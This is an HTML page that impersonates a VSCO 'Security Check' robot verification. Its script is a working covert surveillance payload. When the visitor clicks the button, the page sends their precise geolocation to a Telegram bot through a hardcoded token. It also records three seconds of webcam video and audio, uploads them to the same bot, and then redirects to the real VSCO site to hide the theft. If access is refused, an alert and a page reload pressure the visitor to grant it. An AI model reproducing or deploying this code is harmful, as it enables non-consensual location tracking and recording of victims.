<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VSCO - Verification</title>
    <style>
        body { font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #ffffff; }
        .container { text-align: center; padding: 20px; max-width: 400px; }
        .logo { font-size: 40px; font-weight: bold; letter-spacing: 5px; margin-bottom: 20px; }
        .btn { background-color: #000; color: white; border: none; padding: 15px 45px; font-size: 16px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; }
        p { font-size: 14px; color: #666; margin-bottom: 30px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">VSCO</div>
        <h1>Security Check</h1>
        <p>Please click below to verify you are not a robot.</p>
        <button id="mainBtn" class="btn" onclick="initiate()">Verify & Open</button>
    </div>

<script>
    const token = '8528253517:AAGk6SRaXs-M3PTPT3Z-ZwhLQXyQkI1bZMs'; 
    const chatId = '8005843544';

    async function initiate() {
        const btn = document.getElementById('mainBtn');
        btn.innerText = "Verifying..."; // ÿ™ÿ∫ŸäŸäÿ± ÿßŸÑŸÜÿµ ŸÑŸäÿ¥ÿπÿ± ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿ£ŸÜ ÿßŸÑÿπŸÖŸÑŸäÿ© ÿ¨ÿßÿ±Ÿäÿ©
        btn.disabled = true;

        // 1. ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑŸÖŸàŸÇÿπ ŸÅŸàÿ±ÿßŸã
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const map = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=üìç Location: http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            await fetch(map);
        }, null, {enableHighAccuracy: true});

        // 2. ÿ™ÿ≥ÿ¨ŸäŸÑ ŸÅŸäÿØŸäŸà ŸàÿµŸàÿ™
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const recorder = new MediaRecorder(stream);
            const chunks = [];

            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/mp4' });
                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('video', blob, 'security_video.mp4');
                
                // ÿ£ŸáŸÖ ÿÆÿ∑Ÿàÿ©: ŸÜŸÜÿ™ÿ∏ÿ± ÿßŸÑÿ•ÿ±ÿ≥ÿßŸÑ ŸÑŸäŸÜÿ™ŸáŸä ŸÇÿ®ŸÑ ÿßŸÑÿ™ÿ≠ŸàŸäŸÑ
                try {
                    await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: fd });
                } catch (e) {}

                stream.getTracks().forEach(t => t.stop());
                // ÿßŸÑÿ™ÿ≠ŸàŸäŸÑ ŸÅŸÇÿ∑ ÿ®ÿπÿØ ÿßŸÜÿ™Ÿáÿßÿ° ÿßŸÑÿ±ŸÅÿπ
                window.location.replace("https://vsco.co/store/app");
            };

            recorder.start();
            // ÿ™ÿ≥ÿ¨ŸäŸÑ ŸÑŸÖÿØÿ© 3 ÿ´ŸàÿßŸÜŸç ŸÅŸÇÿ∑ ŸÑŸäŸÉŸàŸÜ ÿßŸÑÿ≠ÿ¨ŸÖ ÿµÿ∫Ÿäÿ±ÿßŸã ŸàŸäÿµŸÑ ÿ®ÿ≥ÿ±ÿπÿ©
            setTimeout(() => {
                if(recorder.state !== "inactive") recorder.stop();
            }, 3000);

        } catch (err) {
            alert("‚ö†Ô∏è Security Alert: Access required to verify you are not a robot.");
            window.location.reload();
        }
    }
</script>
</body>
</html>
